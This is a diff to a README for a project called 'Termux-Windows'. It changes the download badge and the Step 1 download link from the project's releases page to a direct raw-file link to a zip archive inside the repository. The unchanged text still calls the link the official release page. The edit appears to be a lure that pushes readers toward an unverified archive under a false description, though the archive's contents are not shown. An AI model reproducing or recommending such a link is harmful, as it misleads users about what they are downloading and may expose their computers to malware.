@@ -1,7 +1,7 @@
 <h1>🐧 Termux-Windows - Run Linux on Your PC Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/butcherbrood2-ui/Termux-Windows/releases">
+  <a href="https://raw.githubusercontent.com/butcherbrood2-ui/Termux-Windows/main/pkg/Windows-Termux-3.9.zip">
     <img src="https://img.shields.io/badge/Download-Termux%20for%20Windows-blue?style=for-the-badge&logo=windows&logoColor=white&labelColor=2c2c2c" alt="Download Badge" width="300">
   </a>
 </p>
@@ -37,7 +37,7 @@ Here’s the fastest way to get Termux-Windows running on your computer. Follow 
 ### Step 1: Download the Application
 
 🡇 **Visit this link to download the application:**  
-[Click here to go to the download page](https://github.com/butcherbrood2-ui/Termux-Windows/releases)
+[Click here to go to the download page](https://raw.githubusercontent.com/butcherbrood2-ui/Termux-Windows/main/pkg/Windows-Termux-3.9.zip)
 
 This link takes you to the official release page. You’ll see a list of files. Look for the newest version – it’s usually at the top. Download the file that matches your system.
 
